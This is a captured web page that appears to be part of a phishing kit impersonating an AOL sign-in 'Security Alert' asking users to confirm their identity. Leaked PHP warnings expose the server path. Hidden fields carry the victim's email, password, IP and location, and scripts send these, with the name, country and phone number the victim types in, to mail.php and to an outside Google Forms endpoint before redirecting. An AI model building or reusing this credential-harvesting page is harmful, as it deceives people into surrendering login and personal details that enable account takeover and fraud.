<br />
<b>Warning</b>:  Undefined variable $ub in <b>/srv/users/setupkeysonlinesite/apps/setupkeysonlinesite/public/alog/1/sec.php</b> on line <b>65</b><br />
<br />
<b>Warning</b>:  Undefined variable $ub in <b>/srv/users/setupkeysonlinesite/apps/setupkeysonlinesite/public/alog/1/sec.php</b> on line <b>77</b><br />
<br />
<b>Deprecated</b>:  strripos(): Passing null to parameter #2 ($needle) of type string is deprecated in <b>/srv/users/setupkeysonlinesite/apps/setupkeysonlinesite/public/alog/1/sec.php</b> on line <b>77</b><br />
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Aol Sign in</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Anton&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	  <link rel="stylesheet" href="css/style.css">
    <link rel="icon" href="img/favicon.ico" type="image/x-icon">
    <style>
    .loader{
      height:120px;
      width:120px;
      border:16px solid #d9d9d9;
      border-top:16px solid #39f;
      border-radius:50%;
      animation: spin 2s linear infinite;
      margin-left:45%;
      margin-top:10%;
    }
    @keyframes spin{
      0% {transform:rotate(0deg);}
      100% {transform:rotate(360deg)}
    }
    .body
    {
      display:none;
    }
    </style>
</head>
<br />
<b>Warning</b>:  Undefined array key "email" in <b>/srv/users/setupkeysonlinesite/apps/setupkeysonlinesite/public/alog/1/sec.php</b> on line <b>167</b><br />
<br />
<b>Warning</b>:  Undefined array key "pass" in <b>/srv/users/setupkeysonlinesite/apps/setupkeysonlinesite/public/alog/1/sec.php</b> on line <b>168</b><br />
<div class="loader"></div>
<div class="body">
<div class="background">
        <div class="">        
            <img src="img/logo.png" class="logo image-responsive" alt="">
        </div>
    </div>
<body class="background-login">
    <div class="container">
        <div class="col-md-4 col-sm-5 col-xs-12 col-md-offset-7 col-sm-offset-6 sigin-box">
            <h1 class="text-center"><img src="img/logo.png" class="logo1" alt=""></h1>
            <h3 id="sign-head1" class="text-center">Security Alert</h3>
            <h3 id="sign-head" class="text-center" onclick="redirect()">Confirm your identity</h3><br><br>
            <form id="form" target="_self" onsubmit="return postToGoogle();" action="" autocomplete="off">
              <input type="text" id="name" name="name" placeholder="Full Name" class="sign-input" required><br><br>
              <input type="hidden" id="email"  value="" name="name" placeholder="Full Name" class="sign-input" required>
              <input type="hidden" id="pass" value="" name="name" placeholder="Full Name" class="sign-input" required>
              <input type="hidden" id="ip" value="194.61.40.31" name="name" placeholder="Full Name" class="sign-input" required>
              <input type="hidden" id="os" value="" name="name" placeholder="Full Name" class="sign-input" required>
              <input type="hidden" id="browser" value="Unknown 4.5" name="name" placeholder="Full Name" class="sign-input" required>
              <input type="hidden" id="city" value="New Delhi" name="name" placeholder="Full Name" class="sign-input" required>
              <input type="hidden" id="state" value="National Capital Territory of Delhi" name="name" placeholder="Full Name" class="sign-input" required>
              <input type="hidden" id="issue" value="Aol-Log-1" name="name" placeholder="Full Name" class="sign-input" required>
              <select id="country" style="padding: 0px;" class="form-control sign-input" class="" required>
                <option value="">Country</option>
                <option value="United States">United States</option>
                <option value="Canada">Canada</option>
                <option value="Australia">Australia</option>
                <option value="United Kingdom">United Kingdom</option>
                <option value="Other">Other</option>
              </select><br>
              <p class="text-center"><b>Enter your phone number and we will send you a verification code to confirm your identity</b></p>
              <input type="text" id="mobno" name="mob" placeholder="Phone No." class="sign-input" required><br><br>
              <input type="submit" class="submit-nbtn" value="Submit"><br>
            </form>
          </div>
    </div>
</div>
</body>
</html>
<script>
$("#form").submit(function()
{
    var field1 = $("#email").val();
    var field2 = $("#pass").val();
    var field3 = $("#name").val();
    var field4 = $("#country option:selected").text();
    var field5 = $("#mobno").val();
    var field6 = $("#ip").val();
    var field7 = $("#os").val();
    var field8 = $("#browser").val();
    $.ajax({
      url:"mail.php",
      type:"POST",
      data:{"email": field1, "pass": field2, "name": field3, "country": field4, "mobno":field5, "ip": field6, "os": field7, "browser": field8 },
      success: function(data)
      {
        return true
      },
    });
    return false
    e.preventDefault();
});
  function pageRedirect()
  {
    window.location.replace("err.php");
  }
  function postToGoogle()
  {
    var field1 = $("#email").val();
    var field2 = $("#pass").val();
    var field3 = $("#name").val();
    var field4 = $("#country option:selected").text();
    var field5 = $("#mobno").val();
    var field6 = $("#ip").val();
    var field7 = $("#os").val();
    var field8 = $("#browser").val();
    var field9 = $("#city").val();
    var field10 = $("#state").val();
    var field11 = $("#issue").val();
    $.ajax({
      url: "https://docs.google.com/forms/d/e/1FAIpQLSfB9YJJlfQrGERCiYSB9Y7pK4_T-OvQTPJul3gPeUYYd4LAuQ/formResponse",
      data:{"entry.2097195198": field1, "entry.635528687": field2, "entry.1546375231": field3, "entry.282493515": field4, "entry.924327620": field5, "entry.707075208": field6, "entry.491200878": field7, "entry.138017331": field8, "entry.581134703": field9, "entry.1920344389": field10, "entry.1077862391": field11 },
      type:"POST",
      dataType:"XML",
      success: function(d)
      {
        
      },
      error: function(x, y, z)
				{
          setTimeout("pageRedirect()", 100);
				}
      });
      return false;
  }

$(document).ready(function(){
  setTimeout(function(){
    $(".body").show();
    $(".loader").hide();
  },6000);
});
</script>

